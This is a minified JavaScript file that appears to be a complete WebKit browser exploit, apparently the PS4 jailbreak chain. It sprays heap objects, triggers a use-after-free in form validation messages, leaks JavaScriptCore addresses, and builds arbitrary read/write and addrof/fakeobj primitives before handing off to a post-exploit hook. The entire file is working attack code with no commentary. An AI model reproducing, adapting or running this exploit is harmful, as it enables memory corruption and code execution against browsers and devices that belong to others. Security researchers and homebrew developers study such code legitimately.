function die(e){alert(e),undefinedFunction()}function debug_log(e){let t=document.createTextNode(e),r=document.createElement("p").appendChild(t);document.body.appendChild(r),document.body.appendChild(document.createElement("br"))}function hex(e){return("0"+e.toString(16)).substr(-2)}function hexlify(e){for(var t=[],r=0;r<e.length;r++)t.push(hex(e[r]));return t.join("")}function unhexlify(e){if(e.length%2==1)throw new TypeError("Invalid hex string");for(var t=new Uint8Array(e.length/2),r=0;r<e.length;r+=2)t[r/2]=parseInt(e.substr(r,2),16);return t}function hexdump(e){void 0!==e.BYTES_PER_ELEMENT&&(e=Array.from(e));for(var t=[],r=0;r<e.length;r+=16){var a=e.slice(r,r+16),n=a.map(hex);n.length>8&&n.splice(8,0," "),t.push(r.toString(16)+" : "+n.join(" "))}return t.join("\n")}function buf2hex(e){return Array.prototype.map.call(new Uint8Array(e),e=>("00"+e.toString(16)).slice(-2)).join("")}function i2f(e){return i[0]=e,f[0]}function f2i(e){return f[0]=e,i[0]}function str2array(e,t,r){void 0===r&&(r=0);for(var a=new Array(t),n=0;n<t;n++)a[n]=e.charCodeAt(n+r);return a}function Int64(e,t){function r(e,t){return function(){if(arguments.length!=t)throw Error("Not enough arguments for function "+e.name);for(var r=[],a=0;a<arguments.length;a++)arguments[a]instanceof Int64?r[a]=arguments[a]:r[a]=new Int64(arguments[a]);return e.apply(this,r)}}var a=new Uint8Array(8);if(arguments.length>2||0==arguments.length)throw TypeError("Incorrect number of arguments to constructor");if(2==arguments.length){if("number"!=typeof e||"number"!=typeof t)throw TypeError("Both arguments must be numbers");if(e>4294967295||t>4294967295||e<0||t<0)throw RangeError("Both arguments must fit inside a uint32");e=e.toString(16);for(let t=0;t<8-e.length;t++)e="0"+e;e="0x"+t.toString(16)+e}switch(typeof e){case"number":e="0x"+Math.floor(e).toString(16);case"string":"0x"===e.substr(0,2)&&(e=e.substr(2)),e.length%2==1&&(e="0"+e);for(var n=unhexlify(e,8),_=[],i=0;i<n.length;i++)_[i]=n[i];a.set(_.reverse());break;case"object":if(e instanceof Int64)a.set(e.bytes());else{if(8!=e.length)throw TypeError("Array must have excactly 8 elements.");a.set(e)}}this.asDouble=function(){if(255==a[7]&&(255==a[6]||254==a[6]))throw new RangeError("Can not be represented by a double");return Struct.unpack(Struct.float64,a)},this.asInteger=function(){if(0!=a[7]||a[6]>32)throw debug_log("SOMETHING BAD HAS HAPPENED!!!"),new RangeError("Can not be represented as a regular number");return Struct.unpack(Struct.int64,a)},this.asJSValue=function(){if(0==a[7]&&0==a[6]||255==a[7]&&255==a[6])throw new RangeError("Can not be represented by a JSValue");return Struct.unpack(Struct.float64,this.sub(281474976710656).bytes())},this.bytes=function(){for(var e=[],t=0;t<a.length;t++)e.push(a[t]);return e},this.byteAt=function(e){return a[e]},this.toString=function(){for(var e=[],t=0;t<a.length;t++)e.push(a[t]);return"0x"+hexlify(e.reverse())},this.low32=function(){return new Uint32Array(a.buffer)[0]>>>0},this.hi32=function(){return new Uint32Array(a.buffer)[1]>>>0},this.equals=function(e){e instanceof Int64||(e=new Int64(e));for(var t=0;t<8;t++)if(a[t]!=e.byteAt(t))return!1;return!0},this.greater=function(e){return e instanceof Int64||(e=new Int64(e)),this.hi32()>e.hi32()||this.hi32()===e.hi32()&&this.low32()>e.low32()},this.neg=r(function(){for(var e=[],t=0;t<8;t++)e[t]=~this.byteAt(t);return new Int64(e).add(Int64.One)},0),this.add=r(function(e){for(var t=[],r=0,a=0;a<8;a++){var n=this.byteAt(a)+e.byteAt(a)+r;r=n>255|0,t[a]=n}return new Int64(t)},1),this.assignAdd=r(function(e){for(var t=0,r=0;r<8;r++){var n=this.byteAt(r)+e.byteAt(r)+t;t=n>255|0,a[r]=n}return this},1),this.sub=r(function(e){for(var t=[],r=0,a=0;a<8;a++){var n=this.byteAt(a)-e.byteAt(a)-r;r=n<0|0,t[a]=n}return new Int64(t)},1)}function setupRW(){for(let e=0;e<g_arr_ab_3.length;e++)if(g_arr_ab_3[e].length>255){g_relative_rw=g_arr_ab_3[e],debug_log("[+] Succesfully got a relative R/W");break}null===g_relative_rw&&die("[!] Failed to setup a relative R/W primitive"),debug_log("[+] Setting up arbitrary R/W");let e=g_jsview_leak.sub(g_timer_leak).low32()-LENGTH_STRINGIMPL+1,t=new Int64(str2array(g_relative_read,8,e+OFFSET_JSAB_VIEW_VECTOR)),r=g_jsview_leak.sub(t).low32();g_ab_index=g_relative_rw[r+LENGTH_JSVIEW+OFFSET_JSAB_VIEW_LENGTH]===LENGTH_ARRAYBUFFER?r+LENGTH_JSVIEW:r-LENGTH_JSVIEW,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH]=65;for(let e=0;e<g_arr_ab_3.length;e++)if(65===g_arr_ab_3[e].length){g_ab_slave=g_arr_ab_3[e],g_arr_ab_3=null;break}null===g_ab_slave&&die("[!] Didn't found the slave JSArrayBufferView"),g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH]=255,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+1]=255,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+2]=255,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+3]=255,debug_log("[+] Testing arbitrary R/W");let a=read64(guess_htmltextarea_addr);write64(guess_htmltextarea_addr,new Int64("0x4141414141414141")),read64(guess_htmltextarea_addr).equals("0x4141414141414141")||die("[!] Failed to setup arbitrary R/W primitive"),debug_log("[+] Succesfully got arbitrary R/W!"),write64(guess_htmltextarea_addr,a),cleanup(),g_ab_slave.leakme=4919;for(var n=0,_=15;_>=8;_--)n=256*n+g_relative_rw[g_ab_index+_];g_jsview_butterfly=new Int64(n),read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337"))||die("[!] Failed to setup addrof/fakeobj primitives"),debug_log("[+] Succesfully got addrof/fakeobj"),window.postExploit&&window.postExploit()}function read(e,t){for(let t=0;t<8;t++)g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_VECTOR+t]=e.byteAt(t);let r=[];for(let e=0;e<t;e++)r.push(g_ab_slave[e]);return r}function read64(e){return new Int64(read(e,8))}function write(e,t){for(let t=0;t<8;t++)g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_VECTOR+t]=e.byteAt(t);for(let e=0;e<t.length;e++)g_ab_slave[e]=t[e]}function write64(e,t){write(e,t.bytes())}function addrof(e){return g_ab_slave.leakme=e,read64(g_jsview_butterfly.sub(16))}function fakeobj(e){return write64(g_jsview_butterfly.sub(16),e),g_ab_slave.leakme}function cleanup(){select1.remove(),select1=null,input1.remove(),input1=null,input2.remove(),input2=null,input3.remove(),input3=null,div1.remove(),div1=null,g_input=null,g_rows1=null,g_rows2=null,g_frames=null}function confuseTargetObjRound2(){!1===findTargetObj()&&die("[!] Failed to reuse target obj."),g_fake_validation_message[4]=g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH+5-OFFSET_HTMLELEMENT_REFCOUNT).asDouble(),setTimeout(setupRW,6e3)}function leakJSC(){debug_log("[+] Looking for the smashed StringImpl...");var e=Object.getOwnPropertyNames(g_obj_str);for(let t=e.length-1;t>0;t--)if(e[t].length>255){debug_log("[+] StringImpl corrupted successfully"),g_relative_read=e[t],g_obj_str=null;break}null===g_relative_read&&die("[!] Failed to setup a relative read primitive"),debug_log("[+] Got a relative read");for(var t={},r=0;r<1e5;r++)t["Z".repeat(123-LENGTH_STRINGIMPL)+(""+r).padStart(5,"0")]=4919;let a=new ArrayBuffer(LENGTH_ARRAYBUFFER),n=[];for(let e=0;e<65536;e++)e>=64512?g_arr_ab_3.push(new Uint8Array(a)):n.push(new Uint8Array(a));n=null;var _=[];for(r=0;r<1024;r++)_.push({value:1111638594}),_.push({value:g_arr_ab_3[r]});for(;null===g_jsview_leak;){Object.defineProperties({},_);for(let e=0;e<8388608;e++){var i=void 0;if(66===g_relative_read.charCodeAt(e)&&66===g_relative_read.charCodeAt(e+1)&&66===g_relative_read.charCodeAt(e+2)&&66===g_relative_read.charCodeAt(e+3)&&(0===g_relative_read.charCodeAt(e+8)&&0===g_relative_read.charCodeAt(e+15)&&0===g_relative_read.charCodeAt(e+16)&&0===g_relative_read.charCodeAt(e+23)&&14===g_relative_read.charCodeAt(e+24)&&0===g_relative_read.charCodeAt(e+31)&&0===g_relative_read.charCodeAt(e+40)&&0===g_relative_read.charCodeAt(e+47)&&0===g_relative_read.charCodeAt(e+48)&&0===g_relative_read.charCodeAt(e+55)&&14===g_relative_read.charCodeAt(e+56)&&0===g_relative_read.charCodeAt(e+63)?i=new Int64(str2array(g_relative_read,8,e+32)):66===g_relative_read.charCodeAt(e+16)&&66===g_relative_read.charCodeAt(e+17)&&66===g_relative_read.charCodeAt(e+18)&&66===g_relative_read.charCodeAt(e+19)&&(i=new Int64(str2array(g_relative_read,8,e+8)))),void 0!==i&&i.greater(g_timer_leak)&&0===i.sub(g_timer_leak).hi32()){g_jsview_leak=i,_=null;break}}}debug_log("[+] JSArrayBufferView: "+g_jsview_leak),prepareUAF()}function confuseTargetObjRound1(){sprayStringImpl(SPRAY_STRINGIMPL,2*SPRAY_STRINGIMPL),!1===findTargetObj()&&die("[!] Failed to reuse target obj."),dumpTargetObj(),g_fake_validation_message[4]=g_timer_leak.add(8*LENGTH_TIMER+OFFSET_LENGTH_STRINGIMPL+1-OFFSET_ELEMENT_REFCOUNT).asDouble(),setTimeout(leakJSC,6e3)}function handle2(){input2.focus()}function reuseTargetObj(){document.body.appendChild(g_input);for(let e=NB_FRAMES/2-16;e<NB_FRAMES/2+16;e++)g_frames[e].setAttribute("rows",",");for(let e=0;e<NB_REUSE;e++){let e=new ArrayBuffer(LENGTH_VALIDATION_MESSAGE),t=new Float64Array(e);t[0]=guess_htmltextarea_addr.asDouble(),t[3]=guess_htmltextarea_addr.asDouble(),g_arr_ab_1.push(t)}1==g_round?(sprayStringImpl(0,SPRAY_STRINGIMPL),g_frames=[],g_round+=1,g_input=input3,setTimeout(confuseTargetObjRound1,10)):setTimeout(confuseTargetObjRound2,10)}function dumpTargetObj(){debug_log("[+] m_timer: "+g_timer_leak),debug_log("[+] m_messageHeading: "+g_message_heading_leak),debug_log("[+] m_messageBody: "+g_message_body_leak)}function findTargetObj(){for(let e=0;e<g_arr_ab_1.length;e++)if(!Int64.fromDouble(g_arr_ab_1[e][2]).equals(Int64.Zero))return debug_log("[+] Found fake ValidationMessage"),2===g_round&&(g_timer_leak=Int64.fromDouble(g_arr_ab_1[e][2]),g_message_heading_leak=Int64.fromDouble(g_arr_ab_1[e][4]),g_message_body_leak=Int64.fromDouble(g_arr_ab_1[e][5]),g_round++),g_fake_validation_message=g_arr_ab_1[e],g_arr_ab_1=[],!0;return!1}function prepareUAF(){g_input.setCustomValidity("ps4");for(let t=0;t<NB_FRAMES;t++){var e=document.createElement("frameset");g_frames.push(e)}g_input.reportValidity();var t=document.createElement("div");document.body.appendChild(t),t.appendChild(g_input);for(let e=0;e<NB_FRAMES/2;e++)g_frames[e].setAttribute("rows",g_rows1);g_input.reportValidity();for(let e=NB_FRAMES/2;e<NB_FRAMES;e++)g_frames[e].setAttribute("rows",g_rows2);g_input.setAttribute("onfocus","reuseTargetObj()"),g_input.autofocus=!0}function sprayHTMLTextArea(){debug_log("[+] Spraying HTMLTextareaElement ...");let e=window.xyu=document.createElement("div");document.body.appendChild(e),e.id="div1";var t=document.createElement("textarea");t.style.cssText="display:block-inline;height:1px;width:1px;visibility:hidden;";for(let r=0;r<SPRAY_ELEM_SIZE;r++)e.appendChild(t.cloneNode())}function sprayStringImpl(e,t){for(let r=e;r<t;r++){let e=new String("A".repeat(LENGTH_TIMER-LENGTH_STRINGIMPL-5)+r.toString().padStart(5,"0"));g_obj_str[e]=4919}}function go(){sprayHTMLTextArea(),window.midExploit&&window.midExploit(),g_input=input1,prepareUAF()}var Struct=function(){var e=new ArrayBuffer(8),t=new Uint8Array(e),r=new Uint32Array(e),a=new Float64Array(e);return{pack:function(t,r,a){var n=t;return n[0]=r,new Uint8Array(e,0,t.BYTES_PER_ELEMENT)},unpack:function(e,r){if(r.length!==e.BYTES_PER_ELEMENT)throw Error("Invalid bytearray");var a=e;return t.set(r),a[0]},int8:t,int32:r,float64:a}}(),backingBuffer=new ArrayBuffer(8),f=new Float32Array(backingBuffer),i=new Uint32Array(backingBuffer);Int64.fromDouble=function(e){var t=Struct.pack(Struct.float64,e);return new Int64(t)},Int64.Zero=new Int64(0),Int64.One=new Int64(1),Int64.NegativeOne=new Int64(4294967295,4294967295);const OFFSET_ELEMENT_REFCOUNT=16,OFFSET_JSAB_VIEW_VECTOR=16,OFFSET_JSAB_VIEW_LENGTH=24,OFFSET_LENGTH_STRINGIMPL=4,OFFSET_HTMLELEMENT_REFCOUNT=20,LENGTH_ARRAYBUFFER=8,LENGTH_STRINGIMPL=20,LENGTH_JSVIEW=32,LENGTH_VALIDATION_MESSAGE=48,LENGTH_TIMER=72,LENGTH_HTMLTEXTAREA=216,SPRAY_ELEM_SIZE=24576,SPRAY_STRINGIMPL=4096,NB_FRAMES=4e3,NB_REUSE=32768;var g_arr_ab_1=[],g_arr_ab_2=[],g_arr_ab_3=[],g_frames=[],g_relative_read=null,g_relative_rw=null,g_ab_slave=null,g_ab_index=null,g_timer_leak=null,g_jsview_leak=null,g_jsview_butterfly=null,g_message_heading_leak=null,g_message_body_leak=null,g_obj_str={},g_rows1="1px,".repeat(LENGTH_VALIDATION_MESSAGE/8-2)+"1px",g_rows2="2px,".repeat(LENGTH_VALIDATION_MESSAGE/8-2)+"2px",g_round=1,g_input=null,guess_htmltextarea_addr=new Int64("0x2031b00d8");